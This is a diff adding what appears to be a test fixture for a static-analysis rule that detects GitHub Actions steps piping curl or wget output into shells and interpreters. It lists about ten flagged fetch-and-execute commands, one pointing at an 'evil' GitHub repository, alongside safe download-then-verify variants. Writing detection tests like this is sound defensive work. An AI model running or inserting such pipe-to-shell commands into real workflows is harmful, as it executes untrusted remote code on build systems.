@@ -1,0 +1,59 @@
+name: Test gha-curl-pipe-shell rule
+
+on:
+  push:
+    branches: [develop]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      # ruleid: gha-curl-pipe-shell
+      - run: curl -fsSL https://example.com/install.sh | bash
+
+      # ruleid: gha-curl-pipe-shell
+      - run: curl -fsSL https://example.com/install.sh | sh
+
+      # ruleid: gha-curl-pipe-shell
+      - run: curl https://get.example.com | python3
+
+      # ruleid: gha-curl-pipe-shell
+      - run: curl https://get.example.com | python
+
+      # ruleid: gha-curl-pipe-shell
+      - run: curl https://get.example.com | ruby
+
+      # ruleid: gha-curl-pipe-shell
+      - run: curl https://get.example.com | perl
+
+      # ruleid: gha-curl-pipe-shell
+      - run: wget -qO- https://raw.githubusercontent.com/evil/repo/main/install.sh | sh
+
+      # ruleid: gha-curl-pipe-shell
+      - run: wget -qO- https://example.com/setup.sh | bash
+
+      - name: multiline curl pipe bash
+        # ruleid: gha-curl-pipe-shell
+        run: |
+          curl -L https://example.com/setup.sh | bash -s -- --arg
+
+      - name: multiline wget pipe sh
+        # ruleid: gha-curl-pipe-shell
+        run: |
+          wget -qO- https://example.com/install.sh | sh
+
+      # ok: gha-curl-pipe-shell
+      - run: curl -fsSL https://example.com/install.sh | sha256sum
+
+      # ok: gha-curl-pipe-shell
+      - run: curl -o /tmp/install.sh https://example.com/install.sh
+
+      # ok: gha-curl-pipe-shell
+      - run: echo "hello" | bash
+
+      - name: Download only no pipe to shell
+        # ok: gha-curl-pipe-shell
+        run: |
+          curl -fsSL https://example.com/install.sh -o /tmp/install.sh
+          sha256sum /tmp/install.sh
+          bash /tmp/install.sh
